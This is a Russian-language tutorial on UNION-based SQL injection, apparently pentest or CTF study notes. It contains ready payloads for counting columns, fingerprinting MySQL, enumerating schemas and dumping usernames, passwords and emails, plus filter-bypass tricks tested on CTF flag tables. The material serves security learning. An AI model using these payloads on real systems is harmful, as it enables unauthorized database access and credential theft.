# SQL UNION Injection

### Общее представление об атаке SQL UNION Injection

Реализуется в случае, если результаты SQL-запроса возвращаются в ответе приложения. Ответы могут быть разными: ошибки приложения, ошибки сервера, результаты запросов и другие.

**Оператор UNION позволяет запускать один и более SELECT-запросов. Например:**

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Данный SQL-запрос вернет один ответ с двумя столбцами, содержащими значения из столбцов a и b в table1 и столбцов c и d в table2.

**Чтобы успешно выполнить атаку, необходимо знать:**

* Сколько столбцов возвращается из исходного запроса
* Тип данных каждого столбца

### **Определение количества столбцов:**

Есть два способа определения количества столбцов: через `ORDER BY` и `UNION SELECT`.

**Первый способ** - `ORDER BY`:

```sql
' ORDER BY 1 -- - (200 OK)
' ORDER BY 2 -- - (200 OK)
' ORDER BY 3 -- - (200 OK)
' ORDER BY 4 -- - (500 ERROR)
```

В таблице 3 столбца, так как `' ORDER BY 4` выдает ошибку.

**Второй способ** - `UNION SELECT`:

```sql
' UNION SELECT NULL-- (500 ERROR)
' UNION SELECT NULL,NULL -- - (500 ERROR)
' UNION SELECT NULL,NULL,NULL -- - (200 OK)
' UNION SELECT NULL,NULL,NULL,NULL -- - (500 ERROR)
```

Перебираем NULL, пока не получим 200 ОК, т.к. без ошибок

<mark style="color:green;">**Используем NULL, потому что NULL подходит для всех типов данных.**</mark>

### **Определение типа данных каждого столбца:**

```
' UNION SELECT 'a',NULL,NULL,NULL --
' UNION SELECT NULL,'a',NULL,NULL --
' UNION SELECT NULL,NULL,'a',NULL -- 
```

### **Использование внутренних функций базы данных**:

Когда мы знаем количество столбцов, мы можем сделать данную вещь:

```sql
' UNION SELECT version(),null,null -- -
```

Ответ может быть примерно таким(вместо вывода имени пользователя выводится результат функции `version()`):

```
(...)
Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying.
(...)
```

### **Некоторые функции из MySQL:**

```
@@hostname - имя хоста
@@tmpdir - директория /tmp/
@@datadir - директория /data
@@version - версия БД
@@basedir - базовая директория
user() - имя пользователя
database() - база данных
version() - версия
schema() - база данных
UUID() - системный UUID ключ
current_user() - текущий пользователь
current_user - текущий пользователь
system_user() - системный пользователь
session_user() - сессионый пользователь
@@GLOBAL.have_symlink - проверка на включенные/отключенные символьные ссылки
@@GLOBAL.have_ssl - проверка на SSL
```

### Последовательность действий для выполнения успешной атаки

* Определяем количество столбцов
* Определяем тип данных каждого столбца
* Выводим все базы данных:

```sql
'union select group_concat(schema_name),NULL,NULL from information_schema.schemata
```

* Выводим все таблицы из базы данных database1

```sql
'union select group_concat(table_name),NULL,NULL from information_schema.tables where table_schema='database1'
```

* Выводим все колонки из таблицы `table1`, которая находится в базе данных `database1`:

```sql
'union select group_concat(column_name),NULL,NULL from information_schema.columns where table_schema='database1' and table_name='table1'
```

* Выводим все данные `username`, `password`, `email` из таблицы `table1`, которая находится в базе данных `database1`:

```sql
Injection=> select group_concat("\n", username,":",password,":",email,"\n"),NULL,NULL from database1.table1
```

## Обход фильтров

### Запрещено \[ , ' ( ) + = \ " ] + и пробел:

```sql
SELECT * FROM age WHERE age=$age
```

Вместо пробела можно использовать `/**/`, а вместо `where name='b548d45080b9d110'` использовать `where name like 0x62353438643435303830623964313130`:

```sql
1337/**/union/**/select/**/*/**/from/**/flags/**/where/**/name/**/like/**/0x62353438643435303830623964313130
```

### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) , ] + и обход защиты от select:

```sql
SELECT * FROM age WHERE age=$age
```

Так как в таблице очень много флагов и нам нужен флаг с `name`=`3f1a76e536a0a805`, то нужно указать фильтр вывода, например, `where name='3f1a76e536a0a805'`, но знак `=` запрещен, следовательно можно использовать `LIKE` вместе с хексовым значением `name`:

```sql
1337 union Select null,name,flag From flags where name like 0x33663161373665353336613061383035
```

### Запрещено все, кроме символов: a-z A-Z 0-9 ' ( ) \* и обход защиты от select:

```sql
SELECT * FROM age WHERE age=$age
```

Так как мы не можем перебрать количество колонок через `union select null,<null>,<...>`, то можно это сделать через JOIN AS:

```sql
1337 union Select * from flag JOIN (Select 'qwe') as a
```

Ответ:

```sql
MySQL error: The used SELECT statements have a different number of columns
```

Пробуем добавить еще одну колонку:

```sql
1337 union Select * from flag JOIN (Select 'qwe') as a JOIN (Select 'qwe') as b
```

И в ответе мы получаем флаг

### Запрещен SELECT полностью:

```sql
SELECT * FROM age WHERE age=$age
```

Можно использовать SELSELECTECT, если фильтры единоразово вырезают SELECT без цикла:

```sql
1337 union SELSELECTECT null,null,flag from flag
```
